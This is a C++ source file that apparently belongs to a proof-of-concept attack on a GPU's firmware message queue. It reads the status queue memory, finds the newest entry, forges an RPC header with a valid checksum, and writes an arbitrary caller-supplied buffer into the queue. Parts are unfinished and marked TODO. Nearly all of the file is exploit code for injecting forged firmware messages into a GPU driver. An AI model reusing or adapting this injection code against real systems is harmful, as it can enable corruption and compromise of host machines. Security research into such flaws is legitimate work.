#include "message_queue.h"
#include "gpu_instrumentation.h"
#include "utilities.h"
#include <cstdint>
#include <cstring>
#include <dirent.h>
#include <fcntl.h>
#include <optional>
#include <stdexcept>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>
#include <vector>

struct POCConfig {
	bool initialized;
	uintptr_t base_address; // Status Queue base address (absolute)
	uint32_t num_entries; // 64
	uint32_t entry_size; // 4096

	POCConfig()
	    : initialized{false}, base_address{0}, num_entries{63}, entry_size{0x1000}
	{
	}
};

const POCConfig config{};

struct SimpleEntryInfo {
	std::uint64_t offset;
	std::uint32_t seqNum;
};

/*
 * Find the entry in the message queue, which has the largest seqNum and return the pointer to it.
 */
static SimpleEntryInfo findMaxSeqNumEntry(const uint8_t* msgQueue,
					  const uint64_t size)
{
	SimpleEntryInfo maxSeqNumEntry{};
	if (size < 0x2000) {
		return maxSeqNumEntry;
	}
	uint64_t offset{config.entry_size};
	const uint64_t limit{size - config.entry_size};
	while (offset < limit) {
		const uint8_t* seqNumPtr{msgQueue + offset + 0x24};
		const uint32_t seqNum{bufToU32(seqNumPtr)};

		if (seqNum > maxSeqNumEntry.seqNum) {
			maxSeqNumEntry.seqNum = seqNum;
			maxSeqNumEntry.offset = offset;
		}
		offset += config.entry_size;
	}
	return maxSeqNumEntry;
}

static std::vector<std::uint8_t> makePayload(const SimpleEntryInfo& entry,
					     const uint32_t msgLength,
					     const uint32_t rxSeqNum,
					     uint8_t* buffer_ptr,
					     const uint32_t buffer_size)
{
	std::vector<std::uint8_t> payload(msgLength * config.entry_size);
	// make head entry
	StatusQueueEntry head{
	    .seqNum = rxSeqNum,
	    .elemCount = msgLength,
	    .rpc_version = 0x03000000,
	    .rpc_signature = 0x43505256,
	    .rpc_length = 0x20,
	    .rpc_function = 0x1001,
	};
	set_valid_checksum(head);

	if (payload.size() < sizeof(head)) {
		throw std::runtime_error(
		    "Payload is too small for StatusQueueEntry");
	}

	std::memcpy(payload.data(), &head, sizeof(head));

	// TODO: fill in the rest of payload properly
	std::memcpy(payload.data() + sizeof(head), buffer_ptr, buffer_size);

	return payload;
}

int insert_payload(std::uint8_t* buffer_ptr, const std::uint32_t buffer_size)
{
	// NOTE: consider adding check for msgLength >= 17

	const auto info{getGspMsgQueueInfo()};
	if (!info) {
		errno = ENODEV;
		return -1;
	}

	if (buffer_size > info->status_queue_size - 0x1000 ||
	    buffer_size % config.entry_size != 0) {
		errno = EINVAL;
		return -1;
	}

	const std::uint32_t msgLength{(buffer_size / config.entry_size) + 1};
	// dump the entire message quueue
	fprintf(stderr, "[GPU INSTRUMENTATION] Getting entire message queue");
	const auto msgQueue{dumpMemoryRegion(info->status_queue_iova, 0,
					     info->status_queue_size)};
	if (!msgQueue) {
		return -1;
	}
	// find current head
	// const std::uint32_t readPtr{ bufToU32(&msgQueue->data()[0x20]) };

	// find the entry with the highest seqNum
	const SimpleEntryInfo maxSeqNumEntry{findMaxSeqNumEntry(
	    msgQueue->data(), msgQueue->size())};
	// generate and insert payload after maxSeqNumEntry
	const auto payload{makePayload(maxSeqNumEntry, msgLength,
				       info->rxSeqNum, buffer_ptr,
				       buffer_size)};

	// write payload to message queue
	fprintf(stderr,
		"[GPU INSTRUMENTATION] Inserting payload to entry index %lu\n",
		maxSeqNumEntry.offset / 0x1000);
	if (modifyMemoryRegion(info->status_queue_iova, maxSeqNumEntry.offset,
			       payload) == -1) {
		return -1;
	}

	return 0;
}
